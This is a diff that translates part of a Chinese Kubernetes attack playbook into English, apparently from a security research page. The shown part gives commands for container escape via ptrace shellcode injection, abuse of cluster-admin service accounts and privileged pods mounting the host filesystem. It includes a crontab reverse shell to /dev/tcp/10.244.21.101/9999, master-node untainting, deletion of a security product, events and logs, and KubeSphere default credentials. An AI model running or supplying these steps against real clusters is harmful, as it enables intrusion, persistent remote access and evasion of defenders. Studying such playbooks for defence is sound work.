@@ -882,18 +868,15 @@ https://github.com/Xyntax/CDK/wiki/Exploit:-docker-sock-pwn
 
 ![](/img/research/kubernetes-attack-playbook/image74.png)
 
-### 容器获得sys_ptrace_capbility导致的逃逸
+### Escape via a Container with `sys_ptrace` Capability
 
-如果有cap_sys_ptrace的cap就可以使用ptrace的特权，有这个特权可以对其他进程进行调试或者进程注入。但是由于namespace的存在，无法直接访问到宿主机的pid。因此这里一般需要容器的pid
-namespace使用宿主机的。
+If a container has the `cap_sys_ptrace` capability, it can use ptrace privileges to debug or inject into other processes. However, because of namespace isolation, the host PID isn't directly reachable — this typically requires the container's PID namespace to be shared with the host.
 
-所以cap_sys_ptrace逃逸条件：
+So the conditions for `cap_sys_ptrace` escape are:
 
-- 容器有CAP_SYS_PTRACE权限
-
-- 容器与宿主机共用用pid namespace(--pid=host 打破进程隔离)
-
-- 没有apparmor保护
+- The container has `CAP_SYS_PTRACE` capability
+- The container shares the PID namespace with the host (`--pid=host`, breaking process isolation)
+- No AppArmor protection
 
 ![](/img/research/kubernetes-attack-playbook/image75.png)
 
@@ -903,21 +886,19 @@ cat /proc/self/status | grep Cap
 
 ![](/img/research/kubernetes-attack-playbook/image77.png)
 
-这个时候选择宿主机中的进程，来对进程注入代码：
+At this point, select a host process to inject code into:
 
 https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
 
-shellcode随意，msf即可：
+Any shellcode works — msf-generated is fine:
 
 ![](/img/research/kubernetes-attack-playbook/image78.png)
 
-### 利用大权限的 Service Account
+### Exploiting a Highly Privileged Service Account
 
-使用Kubernetes做容器编排的话，在POD启动时，Kubernetes会默认为容器挂载一个
-Service Account 证书。同时，默认情况下Kubernetes会创建一个特有的 Service
-用来指向 ApiServer。
+When using Kubernetes for container orchestration, Kubernetes by default mounts a Service Account credential into a container at pod startup. It also, by default, creates a dedicated Service pointing to the ApiServer.
 
-有了这两个条件，我们就拥有了在容器内直接和APIServer通信和交互的方式。\
+With these two things in place, we have a direct channel to communicate and interact with the APIServer from inside the container.\
 Kubernetes Default Service
 
 ![](/img/research/kubernetes-attack-playbook/image79.png)
@@ -928,24 +909,21 @@ Default Service Account
 
 ![](/img/research/kubernetes-attack-playbook/image81.png)
 
-默认情况下，这个 Service Account 的证书和 token 虽然可以用于和
-Kubernetes Default Service 的 APIServer 通信，但是是没有权限进行利用的。
+By default, this Service Account's certificate and token can be used to talk to the APIServer via the Kubernetes Default Service, but carry no exploitable privileges.
 
-但是集群管理员可以为 Service Account 赋予权限：
+However, a cluster admin can grant the Service Account privileges:
 
 ![](/img/research/kubernetes-attack-playbook/image82.png)
 
-此时直接在容器里执行 kubectl 就可以集群管理员权限管理容器集群。
+At that point, running kubectl directly inside the container grants cluster-admin-level management of the container cluster.
 
-![](/img/research/kubernetes-attack-playbook/image83.png)因此获取一个拥有绑定了
-ClusterRole/cluster-admin Service Account 的
-POD，其实就等于拥有了集群管理员的权限。
+![](/img/research/kubernetes-attack-playbook/image83.png)So obtaining a POD whose Service Account is bound to `ClusterRole/cluster-admin` is effectively equivalent to obtaining cluster-admin privileges.
 
-### 创建特权容器挂载宿主机文件系统
+### Creating a Privileged Container to Mount the Host Filesystem
 
-### 在任意node上创建特权容器
+### Creating a Privileged Container on Any Node
 
-tq.yaml内容
+`tq.yaml` content:
 
 ```yaml
 apiVersion: v1
@@ -968,39 +946,39 @@ spec:
       path: /
 ```
 
-Image需要改动，获取所有pods
+`Image` needs to be changed — get all pods:
 
 ./kubectl get pods --w wide
 
 ![](/img/research/kubernetes-attack-playbook/image84.png)
 
-选择一个pod查看详细信息
+Pick a pod and view its details:
 
 ./kubectl describe pod <pod_name>
 
-可以看到所pod所使用的镜像，替换yaml里的Image即可
+You can see the image the pod uses; substitute it into the YAML's Image field.
 
 ![](/img/research/kubernetes-attack-playbook/image85.png)
 
-./kubectl create --f tq.yaml 创建特权容器
+`./kubectl create --f tq.yaml` to create the privileged container.
 
 ![](/img/research/kubernetes-attack-playbook/image86.png)
 
-查看是否创建成功
+Check whether creation succeeded:
 
 ./kubectl get pods --o wide
 
-执行命令查看是否挂载成功
+Run a command to check whether the mount succeeded:
 
 ./kubectl exec <pod_name> -- ls /mnt/
 
 ![](/img/research/kubernetes-attack-playbook/image87.png)
 
-进入特权容器
+Enter the privileged container:
 
 ./kubectl exec --it <pod_name> -- sh
 
-切换根目录
+Switch root directory:
 
 cd /mnt
 
@@ -1008,34 +986,34 @@ chroot . bash
 
 ![](/img/research/kubernetes-attack-playbook/image88.png)
 
-写计划任务逃逸
+Write a scheduled task to escape:
 
 echo "*/1 * * * * root /bin/bash -i >&
 /dev/tcp/10.244.21.101/9999 0>&1" >> /etc/crontab
 
-### 在Master上创建特权容器
+### Creating a Privileged Container on the Master
 
-当获取到集群控制权限时
+Once you have cluster control:
 
-找到Master的node
+Find the Master node:
 
 kubectl get nodes --o wide
 
 ![](/img/research/kubernetes-attack-playbook/image89.png)
 
-去除污点才可在Master上创建pod
+Remove the taint to allow creating a pod on the Master:
 
 kubectl taint node <node_name> node-role.kubernetes.io/master-
 
 ![](/img/research/kubernetes-attack-playbook/image90.png)
 
-查看taint，值为<None>可创建pod
+Check the taint — a value of `<None>` means a pod can be created:
 
 kubectl describe node <node_name>
 
 ![](/img/research/kubernetes-attack-playbook/image91.png)
 
-Yaml中需要加入nodeSelector并添加label
+The YAML needs a `nodeSelector` with a matching label added:
 
 ![](/img/research/kubernetes-attack-playbook/image92.png)
 
@@ -1062,58 +1040,57 @@ spec:
     kubernetes.io/hostname: node-example-01
 ```
 
-测试后将taint修改回来
+After testing, restore the taint:
 
 kubectl taint node <node_name>
 node-role.kubernetes.io/master:NoSchedule
 
-## 防御逃逸
+## Defense Evasion
 
-### 关闭安全产品
+### Disabling Security Products
 
 ./kubectl get deployments -A
 
 ![](/img/research/kubernetes-attack-playbook/image93.png)
 
-发现安全产品hivesec
+Found a security product, `hivesec`.
 
-导出yaml：./kubectl get deployment hiveagent -n hivesec -o yaml
+Export its YAML: `./kubectl get deployment hiveagent -n hivesec -o yaml`
 
-复制内容另存为hivesec1.yaml
+Copy the content and save it as `hivesec1.yaml`.
 
-删除安全产品：./kubectl delete -f hivesec1.yaml
+Delete the security product: `./kubectl delete -f hivesec1.yaml`
 
-### 删除K8s的Event
+### Deleting K8s Events
 
 ./kubectl delete event --field-selector
 involvedObject.name=<pod_name>
 
 ![](/img/research/kubernetes-attack-playbook/image94.png)
 
-### 容器及宿主机日志清理（Clear container logs）
+### Clearing Container and Host Logs
 
 ls /var/log/containers/
 
 ![](/img/research/kubernetes-attack-playbook/image95.png)
 
-备份后删除再恢复
+Back up, delete, then restore.
 
-代理访问
+Proxied access.
 
-Shadow API Server
+Shadow API Server.
 
-利用系统Pod伪装
+Impersonating a system pod.
 
-创建超长Annotations使Audit日志解析失败
+Creating an excessively long Annotation to break Audit log parsing.
 
-K8s Audit日志清理
+K8s Audit log cleanup.
 
-## 引用处
+## References
 
-### 客户端生成config文件
+### Client-Side Config File Generation
 
-**利用token和api
-server生成kubectl客户端配置文件（后续命令不用再指定-s和--token）**
+**Use the token and API server address to generate a kubectl client config file (subsequent commands no longer need `-s` and `--token`):**
 
 kubectl config set-cluster kubernetes --insecure-skip-tls-verify=true
 --server=https://IP:6443/
@@ -1127,17 +1104,16 @@ kubectl config use-context kubernetes
 
 ![](/img/research/kubernetes-attack-playbook/image96.png)
 
-### KubeSphere Dashboard暴露
+### KubeSphere Dashboard Exposure
 
-Kubesphere的默认口令是admin/
-P@88w0rd，如果不修改密码我们可以通过这个口令登录到系统内如下所示：
+KubeSphere's default credentials are `admin/P@88w0rd` — if unchanged, we can log into the system with them, as shown below:
 
 ![](/img/research/kubernetes-attack-playbook/image97.png)
 
-Kubesphere提供了kubectl命令从而让我们可以直接操作k8s集群。
+KubeSphere provides a kubectl command, letting us operate the k8s cluster directly.
 
 ![](/img/research/kubernetes-attack-playbook/image98.png)
 
-在该窗口能直接使用kubectl，我们可以利用kubectl创建一个特权容器实现容器逃逸
+From this console we can use kubectl directly, and use it to create a privileged container to achieve container escape.
 
 ![](/img/research/kubernetes-attack-playbook/image99.png)
